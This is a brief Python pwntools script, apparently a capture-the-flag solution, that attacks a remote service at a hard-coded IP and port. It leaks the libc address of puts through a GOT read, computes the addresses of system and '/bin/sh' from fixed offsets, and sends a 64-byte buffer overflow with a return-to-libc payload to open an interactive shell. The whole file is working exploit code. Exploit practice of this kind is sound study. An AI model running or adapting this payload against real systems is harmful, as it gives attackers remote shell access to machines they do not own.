from pwn import*
r = remote('140.115.59.7', 11004)

puts_offset = 456144 #0x6f5d0
system_offset = 283520 #0x45380
shell_offset = 1623435 #0x18c58b

r.send("6295576" + "\n") #0x601018, puts 的base
r.recvuntil('The content of the address : ')
puts_addr = r.recvline()

base = int(puts_addr,16) - puts_offset
system_addr = base + system_offset
shell_addr = base + shell_offset

r.send('A'*64 + p64(system_addr) + 'A'*8 + p64(shell_addr))
r.interactive()
